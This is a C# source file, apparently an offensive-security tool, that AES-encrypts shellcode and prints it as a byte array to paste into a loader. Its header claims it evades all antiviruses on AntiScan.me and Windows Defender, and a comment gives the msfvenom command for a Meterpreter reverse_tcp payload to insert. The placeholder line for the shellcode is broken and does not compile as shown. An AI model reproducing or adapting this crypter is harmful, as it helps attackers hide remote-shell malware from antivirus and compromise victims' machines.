//AES Encryption, the same like XOR but with AES Encryption, also bypassed all the AntiViruses on AntiScan.me and the latest windows defender 
using System.Security.Cryptography;
using System.IO;
using System.Text;
using System;




namespace AESEncrypt
{
    class Program
    {
        static void Main()
        {

//remove this and put your shellcode: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f csharp
            byte[] shellcode = new byte[000] {//your-ShellCode-Here };


            byte[] passwordBytes = Encoding.UTF8.GetBytes("This!sMyP@SS");

            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = AES_Encrypt(shellcode, passwordBytes);

            StringBuilder newshellcode = new StringBuilder();
            newshellcode.Append("byte[] shellcode = new byte[");
            newshellcode.Append(bytesEncrypted.Length);
            newshellcode.Append("] { ");
            for (int i = 0; i < bytesEncrypted.Length; i++)
            {
                newshellcode.Append("0x");
                newshellcode.AppendFormat("{0:x2}", bytesEncrypted[i]);
                if (i < bytesEncrypted.Length - 1)
                {
                    newshellcode.Append(", ");
                }
            }

                newshellcode.Append(" };");
                Console.WriteLine(newshellcode.ToString());
                Console.WriteLine("");
                Console.WriteLine("");

            
            static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
            {
                byte[] encryptedBytes = null;

                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

                using (MemoryStream ms = new MemoryStream())
                {
                    using (RijndaelManaged AES = new RijndaelManaged())
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;

                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);

                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                            cs.Close();
                        }
                        encryptedBytes = ms.ToArray();
                    }
                }

                return encryptedBytes;
            }

        }
    }
}
        
